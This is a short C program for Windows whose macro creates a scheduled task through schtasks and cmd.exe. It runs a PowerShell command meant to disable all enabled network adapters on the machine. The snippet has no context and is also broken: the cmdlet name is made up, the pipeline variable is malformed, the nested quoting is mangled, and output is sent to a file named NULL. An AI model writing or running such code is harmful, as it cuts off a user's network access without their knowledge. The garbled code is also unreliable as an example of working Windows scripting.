#include <windows.h>

#define RUN(toRun) WinExec("schtasks /create /tn MyTask /tr \"cmd.exe /c \"" toRun "\" /sc once /st 00:00", SW_SHOW);

int main() {
    RUN("powershell -Command \"Fetch-MyWmiObject-class Win32_NetworkAdapter | ForEach{ If($.NetEnabled) { $.Disable() } }\" > NULL");
    return 0;
}